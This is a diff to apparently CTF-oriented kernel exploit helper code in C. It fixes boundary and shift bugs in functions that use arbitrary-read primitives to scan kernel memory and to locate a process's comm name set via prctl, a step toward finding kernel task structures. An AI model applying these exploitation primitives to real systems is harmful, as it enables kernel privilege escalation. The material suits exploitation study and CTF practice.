@@ -15,13 +15,13 @@ static bool found_target(void *const addr, void *const target, const uint64_t le
         for (uint64_t offset = 0; offset < len; offset += 4) {
             uint32_t actual;
             uint32_t expect;
-            if (likely(offset + 4 < len)) {
+            if (likely(offset + 4 <= len)) {
                 actual = aar32(addr + offset);
                 expect = *(uint32_t *)(target + offset);
             } else {
                 uint64_t rest = len - offset;
                 actual = aar32(addr + offset);
-                expect = (*(uint32_t *)(target + offset)) & ((1 << (8 * rest)) - 1);
+                expect = (*(uint32_t *)(target + offset)) & ((1u << (8 * rest)) - 1);
             }
             if (likely(actual != expect)) {
                 return false;
@@ -33,13 +33,13 @@ static bool found_target(void *const addr, void *const target, const uint64_t le
         for (uint64_t offset = 0; offset < len; offset += 8) {
             uint64_t actual;
             uint64_t expect;
-            if (likely(offset + 8 < len)) {
+            if (likely(offset + 8 <= len)) {
                 actual = aar64(addr + offset);
                 expect = *(uint64_t *)(target + offset);
             } else {
                 uint64_t rest = len - offset;
                 actual = aar64(addr + offset);
-                expect = (*(uint64_t *)(target + offset)) & ((1 << (8 * rest)) - 1);
+                expect = (*(uint64_t *)(target + offset)) & ((1ull << (8 * rest)) - 1);
             }
             if (likely(actual != expect)) {
                 return false;
@@ -83,7 +83,7 @@ void *find_target_from_heap(void *const addr_start, void *const target, const ui
 }
 
 void *find_comm(void *const addr_start, uint32_t (*aar32)(void *), uint64_t (*aar64)(void *)) {
-    char name[] = "maimai";
+    char name[] = "kernel pwnable";
     assert(sizeof(name) <= 16);
     CHECK(prctl(PR_SET_NAME, name));
     printf("[ ] start searching comm from %p\n", addr_start);
